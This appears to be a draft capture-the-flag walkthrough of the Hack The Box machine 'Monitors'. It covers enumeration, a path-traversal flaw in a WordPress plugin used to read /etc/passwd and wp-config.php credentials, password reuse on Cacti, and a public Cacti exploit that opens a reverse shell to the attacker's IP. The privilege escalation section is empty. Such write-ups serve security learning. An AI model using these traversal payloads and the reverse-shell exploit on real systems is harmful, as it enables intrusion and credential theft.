---
layout: post
title: Monitors
published: false
---

**Monitors is a hard machine from Hack The Box.**

### Enumeration 

The first step for this spooky box is `nmap`:

`nmap -sT -sC -sV -vv -min-rate 4000 -max-retries 1 -p- -oA enum/nmap_allports 10.10.10.238`

```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5AeQDHYQGVg8GiNvPYiXYPseampZJusZb2Dbd2d1QIi7a/LGOO9ylbMgjxcve5euzCFBMSX2rVIp8zkUg3CCi7JYLpyQAeP0npjT/fB84dWbzt51Xmfir4qZTpBMf8Lw+ZFxEXv1UkGfejSZ3fjcuZ2hBBeUh63P2qcomVla/eUyR1dOIvJy8K1pl1WSXia6W2fJsBj/uowwe4+aMtWGVlzMNd+Tpp1Z8lg/a2jZTxkdIYvUkx/k0x0xrjsUhGiLgOoAWg4JvKeYoy+v/hhAjh6fB8Kw7jS1t1Si69cPadEQGB8NOMdyDv4EvoG3/8BvLpMgpHKzy1aHsJk9zqyej
|   256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKHKAgNKkq5XDcAfsuuxZFMPf+iEHjoq9DUmOmg0cCDgpE90GNOZeoaI24IlwlrSdTWTRA9HNJ7DFyIkcHr37Dk=
|   256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBi/L9gWCzbJ6GzFB1PsHZJco24eJW3wmC+a4Ul6fEe6
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The web server doesn't like when I try to access it via IP address:

![Pasted image 20210726162829](https://user-images.githubusercontent.com/60187707/138783257-adf4b3ca-d451-4410-9339-deae35c55885.png)

So I add `monitors.htb` to my `/etc/hosts` file to access it that way and I get a home page:

![Pasted image 20210726163820](https://user-images.githubusercontent.com/60187707/138783971-bf6f4aa5-a5a7-483d-9c9a-5e34f6de5a91.png)

It's a Wordpress site. Not much to be found clicking around, but I'll start a `wpscan` in the background and see if it will turn up any actionable information.

`wpscan --url http://monitors.htb -e -o wpscan.txt`

Found an [RFI vulnerability](https://www.exploit-db.com/exploits/44544) in a plugin called Spritz. That's certainly promising. As a proof of concept, I'll pull see if I can get it to show me `/etc/passwd` by accessing http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd.

![Pasted image 20210726164413](https://user-images.githubusercontent.com/60187707/138784416-1c1d9270-ecb6-4406-963c-2c652bb2889e.png)

Now that I know I can retrieve system files, I need to find files that might have sensitive info. To do that, I can use a fuzzer like `wfuzz` to run wordlists of system file paths and find them automatically.

`wfuzz -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../..FUZZ`

After running a few different lists through `wfuzz`, eventually I discover `/etc/apache2/sites-enabled/000-default.conf`.

![Pasted image 20210727103601](https://user-images.githubusercontent.com/60187707/138784729-1e46d1c2-a2e9-4303-92d9-9feaf947233d.png)

This file contains a reference to a virtual host at `cacti-admin.monitors.htb`, which I will add to my `/etc/hosts/file`. I'll get back to that in a minute. I'm gonna keep going through the files `wfuzz` found.

Looking into `/etc/apache2/sites-enabled/monitors.htb.conf` lets me know that the webroot of `monitors.htb` is at `/var/www/wordpress`. With that in mind, I should be able to locate `wp-config`.

`curl http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../../var/www/wordpress/wp-config.php`
```// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wpadmin' );

/** MySQL database password */
define( 'DB_PASSWORD', 'BestAdministrator@2020!' );
```

As expected, `wp-config` yields some SQL credentials. Those may be useful eventually. Back to Cacti.

![Pasted image 20210727104651](https://user-images.githubusercontent.com/60187707/138785336-a944fdfa-ba17-4a41-98b9-ae1d20b61d86.png)

A login page. How about I try those credentials I just found? `admin:BestAdministrator@2020!` gets me in.

![Pasted image 20210727104818](https://user-images.githubusercontent.com/60187707/138785433-1e727551-6dc3-4d84-a516-ec5697376549.png)

I've never heard of Cacti before. Some quick research tells me a bit about it. A  "monitoring and fault management framework". 

![Pasted image 20210727105044](https://user-images.githubusercontent.com/60187707/138785536-135e3a22-7707-4190-b40f-56cd6b55f105.png)

### Exploitation

Looking around, there's not much data being hosted or monitored by the app and I'm not finding anything too interesting. Maybe `searchsploit` has something for me.

`searchsploit cacti`

![Pasted image 20210727111656](https://user-images.githubusercontent.com/60187707/138785635-ee9816b6-dc69-4295-b407-e174fe3f2e73.png)

This exploit matches the version number of 1.2.12(according to the homepage), so I'll try this one first. With a valid password, I can gain remote command execution on the server. This exploit will send a reverse shell back my way.

`python3 49810.py -t http://cacti-admin.monitors.htb -u admin -p BestAdministrator@2020! --lhost 10.10.14.22 --lport 443`

![Pasted image 20210727111734](https://user-images.githubusercontent.com/60187707/138785946-c27f6faa-38d6-4b96-b8f3-bd37f46a1fd6.png)

Run the command, and I'm on as `www-data`.

![Pasted image 20210727111756](https://user-images.githubusercontent.com/60187707/138785980-3ad9a34d-960e-4f63-a32a-feabedeefb5f.png)

### Privilege Escalation



